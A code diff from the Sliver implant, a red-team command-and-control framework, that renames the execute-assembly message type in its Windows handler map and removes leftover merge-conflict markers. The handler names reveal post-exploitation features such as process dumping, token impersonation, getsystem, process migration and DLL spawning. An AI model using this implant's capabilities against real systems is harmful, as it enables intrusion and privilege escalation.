@@ -44,20 +44,20 @@ var (
 	windowsHandlers = map[uint32]RPCHandler{
 
 		// Windows Only
-		sliverpb.MsgTaskReq:            taskHandler,
-		sliverpb.MsgProcessDumpReq:     dumpHandler,
-		sliverpb.MsgImpersonateReq:     impersonateHandler,
-		sliverpb.MsgRevToSelfReq:       revToSelfHandler,
-		sliverpb.MsgRunAsReq:           runAsHandler,
-		sliverpb.MsgInvokeGetSystemReq: getsystemHandler,
-		sliverpb.MsgExecuteAssemblyReq: executeAssemblyHandler,
-		sliverpb.MsgInvokeMigrateReq:   migrateHandler,
-		sliverpb.MsgSpawnDllReq:        spawnDllHandler,
-		sliverpb.MsgStartServiceReq:    startService,
-		sliverpb.MsgStopServiceReq:     stopService,
-		sliverpb.MsgRemoveServiceReq:   removeService,
-		sliverpb.MsgEnvReq:             getEnvHandler,
-		sliverpb.MsgExecuteTokenReq:    executeTokenHandler,
+		sliverpb.MsgTaskReq:                  taskHandler,
+		sliverpb.MsgProcessDumpReq:           dumpHandler,
+		sliverpb.MsgImpersonateReq:           impersonateHandler,
+		sliverpb.MsgRevToSelfReq:             revToSelfHandler,
+		sliverpb.MsgRunAsReq:                 runAsHandler,
+		sliverpb.MsgInvokeGetSystemReq:       getsystemHandler,
+		sliverpb.MsgInvokeExecuteAssemblyReq: executeAssemblyHandler,
+		sliverpb.MsgInvokeMigrateReq:         migrateHandler,
+		sliverpb.MsgSpawnDllReq:              spawnDllHandler,
+		sliverpb.MsgStartServiceReq:          startService,
+		sliverpb.MsgStopServiceReq:           stopService,
+		sliverpb.MsgRemoveServiceReq:         removeService,
+		sliverpb.MsgEnvReq:                   getEnvHandler,
+		sliverpb.MsgExecuteTokenReq:          executeTokenHandler,
 
 		// Platform specific
 		sliverpb.MsgIfconfigReq:   ifconfigHandler,
@@ -174,14 +174,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 }
 
 func executeAssemblyHandler(data []byte, resp RPCResponse) {
-<<<<<<< HEAD:sliver/handlers/handlers_windows.go
 	execReq := &sliverpb.InvokeExecuteAssemblyReq{}
-=======
-	//{{if .Config.Debug}}
-	log.Println("executeAssemblyHandler called")
-	//{{end}}
-	execReq := &sliverpb.ExecuteAssemblyReq{}
->>>>>>> master:implant/sliver/handlers/handlers_windows.go
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Config.Debug}}
